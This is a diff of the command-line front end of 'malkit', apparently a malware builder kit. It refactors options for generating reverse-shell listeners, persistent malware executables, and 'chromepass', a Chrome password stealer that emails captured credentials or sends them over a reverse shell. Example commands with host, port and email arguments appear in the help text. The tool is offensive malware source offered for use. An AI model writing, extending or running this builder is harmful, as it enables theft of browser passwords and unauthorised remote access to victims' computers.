@@ -6,9 +6,9 @@ import time
 
 from progress.spinner import Spinner
 from darkarp.malkit_modules import build
-#from testing import build
+# from testing import build
 
-# LOAD SETTINGS #
+# #? LOAD SETTINGS #
 
 CONFIG_FILE = "malkit.conf"
 CONFIG = configparser.ConfigParser()
@@ -18,20 +18,23 @@ CONFIG.read(CONFIG_FILE)
 def check_folders():
     if not os.path.exists("builds"):
         os.mkdir("builds")
+    if not os.path.exists("listeners"):
+        os.mkdir("listeners")
 
 
 def build_listener(args):
+    temp_listener = CONFIG["TEMPLATES"]["listener"]
+    check_folders()
     port = args.p
-    with open("templates/listener.mtemp", "r") as f:
+    with open(temp_listener, "r") as f:
         listener_script = f.read()
 
     listener_script_final = listener_script.replace(
         "<<PORT>>", str(port))
-
     with open("listeners/listener.py", "w") as f:
         f.write(listener_script_final)
-    if args.no_interact == False:
-        invalid = True
+
+    if not args.no_interact:
         while True:
             start = input("Would you like to start the listener? [y/n]> ")
             if start.lower() == "y" or start.lower() == 'yes':
@@ -39,6 +42,7 @@ def build_listener(args):
                 break
             elif start.lower() == 'n' or start.lower() == "no":
                 break
+
     return len(listener_script_final)
 
 
@@ -62,7 +66,7 @@ def build_malware(args):
     stub_funclist = CONFIG["STUB"]["FUNC_LIST"]
 
     temp_stub = CONFIG["TEMPLATES"]["stub"]
-    temp_listener = CONFIG["TEMPLATES"]["listener"]
+    #
     temp_malware = CONFIG["TEMPLATES"]["malware"]
 
     # Create Stub
@@ -88,7 +92,9 @@ def build_malware(args):
                    output=startup_name, icon=startup_icon)
 
     include = build.generate_payload(filename=filename,
-                                     destname=payload_name, startup=startup_name, icon="icons/icon.ico")
+                                     destname=payload_name,
+                                     startup=startup_name,
+                                     icon="icons/icon.ico")
 
     build.exebuild(target=target, include=include,
                    output=output, icon="icons/icon.ico")
@@ -116,7 +122,6 @@ def build_chromepass(args):
         print("Not implemented yet")
     if args.email and not args.reverse_shell:
         mailto = args.address
-        #pwd = args.password
         for _ in range(4):
             sys.argv.pop()
 
@@ -178,14 +183,14 @@ def build_chromepass(args):
         return len(cp_final)
 
     elif args.reverse_shell and not args.email:
-        host = args.host
-        port = args.port
         for _ in range(6):
             sys.argv.pop()
-        print("Not implemented yet but it's easier than email... A copy paste will work, adding after rest is working")
+        print("Not implemented yet but it's easier than email... \
+A copy paste will work, adding after rest is working")
 
     else:
-        return print("Error, please specify one option (email or reverse shell)")
+        return print("Error, please specify one option \
+(email or reverse shell)")
 
 
 def getOptions():
@@ -198,11 +203,19 @@ def getOptions():
  python malkit.py build_listener -p 4444'''
 
     parser_build_listener = subparsers.add_parser(
-        'build_listener', epilog=listener_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+        'build_listener',
+        epilog=listener_example,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
     parser_build_listener.add_argument(
-        "-p", type=int, metavar=f"Port for reverse connection", required=True)
+        "-p",
+        type=int,
+        metavar=f"Port for reverse connection",
+        required=True)
     parser_build_listener.add_argument(
-        "--no_interact", default=False, action='store_true', required=False)
+        "--no_interact",
+        default=False,
+        action='store_true',
+        required=False)
     parser_build_listener.set_defaults(func=build_listener)
 
     # Build malware
@@ -211,39 +224,73 @@ def getOptions():
  python malkit.py build_malware --host 127.0.0.1 -p 4444'''
 
     parser_build_malware = subparsers.add_parser(
-        'build_malware', epilog=malware_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+        'build_malware',
+        epilog=malware_example,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
     parser_build_malware.add_argument(
-        "--host", type=str, metavar=f"IP for reverse connection", required=True)
+        "--host",
+        type=str,
+        metavar=f"IP for reverse connection",
+        required=True)
     parser_build_malware.add_argument(
-        "-p", type=int, metavar=f"Port for reverse connection.", required=True)
+        "-p",
+        type=int,
+        metavar=f"Port for reverse connection.",
+        required=True)
     parser_build_malware.set_defaults(func=build_malware)
 
     # Build chromepass
     chromepass_example = '''example:
 
- python malkit.py build_chromepass --email --address test@itsec.bz --password testpassword
+ python malkit.py build_chromepass --email --address test@email.com
  python malkit.py build_chromepass --reverse_shell --host 127.0.0.1 -p 4444
  python malkit.py build_chromepass --load myfile.conf'''
 
     parser_build_chromepass = subparsers.add_parser(
-        'build_chromepass', epilog=chromepass_example, formatter_class=argparse.RawDescriptionHelpFormatter)
+        'build_chromepass',
+        epilog=chromepass_example,
+        formatter_class=argparse.RawDescriptionHelpFormatter)
     parser_build_chromepass.add_argument(
-        "--load", default=False, action="store_true", required=False)
+        "--load",
+        default=False,
+        action="store_true",
+        required=False)
     parser_build_chromepass.add_argument(
-        "--email", default=False, action="store_true", required=False)
+        "--email",
+        default=False,
+        action="store_true",
+        required=False)
     parser_build_chromepass.add_argument(
-        "--reverse_shell", default=False, action='store_true', required=False)
+        "--reverse_shell",
+        default=False,
+        action='store_true',
+        required=False)
     parser_build_chromepass.add_argument(
-        "--no_error", default=False, action='store_true', required=False)
+        "--no_error",
+        default=False,
+        action='store_true',
+        required=False)
 
     parser_build_chromepass.add_argument(
-        "--errormsg", type=str, metavar=f"Error message to appear", required=False)
+        "--errormsg",
+        type=str,
+        metavar=f"Error message to appear",
+        required=False)
     parser_build_chromepass.add_argument(
-        "--address", type=str, metavar=f"Email address to send details to, if Email was chosen", required=False)
+        "--address",
+        type=str,
+        metavar=f"Email address to send details to, if Email was chosen",
+        required=False)
     parser_build_chromepass.add_argument(
-        "--port", type=int, metavar=f"Port for reverse connection, if Reverse shell was chosen.", required=False)
+        "--port",
+        type=int,
+        metavar=f"Port for reverse connection, if Reverse shell was chosen.",
+        required=False)
     parser_build_chromepass.add_argument(
-        "--host", type=str, metavar=f"Host reverse connection, if Reverse shell was chosen.", required=False)
+        "--host",
+        type=str,
+        metavar=f"Host reverse connection, if Reverse shell was chosen.",
+        required=False)
 
     parser_build_chromepass.set_defaults(func=build_chromepass)
 
@@ -254,15 +301,15 @@ def getOptions():
     try:
 
         if args.email and (args.address is None):
-            parser.error("--email requires --address and --password.")
+            parser.error("--email requires --address")
         elif args.reverse_shell and (args.host is None or args.port is None):
             parser.error("--reverse_shell requires --host and --port.")
-    except:
+    except Exception:
         pass
 
     try:
         args.func(args)
-    except Exception as err:
+    except Exception:
         # raise(err)
         return parser.print_help()
     return 0
